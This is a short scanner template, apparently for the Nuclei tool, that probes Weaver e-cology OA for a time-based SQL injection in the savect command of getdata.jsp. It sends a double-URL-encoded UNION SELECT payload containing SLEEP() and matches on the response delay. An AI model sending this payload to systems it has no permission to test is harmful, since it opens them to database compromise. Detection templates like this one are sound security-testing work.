id: poc-yaml-weaver-e-cology-savect-sqli
info:
  name: 泛微OA e-cology savect SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"
  t3: "{{concat('1 union select 1,2,3,4,5,SLEEP(',t1,') #')}}"
  t4: "{{url_encode(url_encode(t3))}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/js/hrm/getdata.jsp?cmd=savect&arg0={{t4}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "ecology"
      - type: dsl
        dsl:
          - "trim(body) == ''"
      - type: dsl
        dsl:
          - "duration > to_number(t1) && duration < to_number(t2)"
